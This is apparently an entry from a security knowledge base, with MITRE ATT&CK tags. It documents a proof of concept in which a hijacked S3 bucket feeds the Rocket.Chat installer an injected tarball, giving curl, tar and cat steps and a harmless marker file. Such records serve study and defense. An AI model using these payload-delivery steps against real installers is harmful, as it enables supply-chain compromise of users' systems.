---
tags:
  - rce
  - extraction
  - payload-delivery
type: procedure
tools:
  - '[[tools/curl]]'
  - '[[tools/tar]]'
  - '[[tools/cat]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/curl-download-rocket-chat-tarball]]'
  - '[[commands/tar-extract-rocket-chat]]'
  - '[[commands/cat-poc-file]]'
verified: false
platforms:
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Remote File Copy]]'
  - '[[Unix Shell]]'
updated_at: '2025-12-14T17:23:42.031Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
id: d022836c-823b-4df3-9ec1-3defd26dcbf4
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Remote File Copy]]'
  - '[[Unix Shell]]'
---
# Download-and-Extract-Malicious-Tarball

## Summary

This procedure simulates the Rocket.Chat installer's download and extraction of a hijacked tarball, delivering and activating malicious payloads for RCE.

## Description

The attacker replicates the install.sh steps by curling the malicious tarball from the claimed S3 bucket, extracting it with tar, and viewing injected files with cat. This occurs on Linux systems and requires network access to S3. Expected outcomes: Malicious files extracted and accessible, demonstrating arbitrary code execution potential during installation.

## Requirements

1. Network access to the hijacked S3 URL
2. curl, tar, and cat utilities available
3. Local directory for extraction

## Defense

Defensive measures and detection strategies:

- Verify tarball integrity with checksums before extraction
- Run installers in sandboxed environments
- Scan extracted files for anomalies during installation

## Objectives

1. Download the injected tarball
2. Extract and access malicious content
3. Validate payload delivery

## Instructions

### Step 1: Download Tarball

**Context**: Fetch the malicious tarball using the script's curl command.

**Command** ([[commands/curl-download-rocket-chat-tarball]]):

```bash
curl -fSL "https://s3.amazonaws.com/rocketchatbuild/rocket.chat-develop.tgz" -o rocket.chat.tgz
```

> Downloads 179 bytes in PoC; progress shown if verbose.

### Step 2: Extract Contents

**Context**: Unpack the tarball to reveal injected files.

**Command** ([[commands/tar-extract-rocket-chat]]):

```bash
tar -xvzf rocket.chat.tgz
```

> Verbose output lists 'frogs-find-bugs/' and 'frogs-find-bugs/hehehe'.

### Step 3: View Injected File

**Context**: Confirm payload extraction by displaying the PoC file.

**Command** ([[commands/cat-poc-file]]):

```bash
cat frogs-find-bugs/hehehe
```

> Outputs 'EdOverflow :D', proving successful injection.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[Remote File Copy]] Ingress Tool Transfer
- [[Unix Shell]] Unix Shell

### Sub-Techniques


## Commands Used

- [[commands/curl-download-rocket-chat-tarball]]
- [[commands/tar-extract-rocket-chat]]
- [[commands/cat-poc-file]]

## Tools Used

- [[tools/curl]]
- [[tools/tar]]
- [[tools/cat]]

## Tags

- rce
- extraction
- payload-delivery
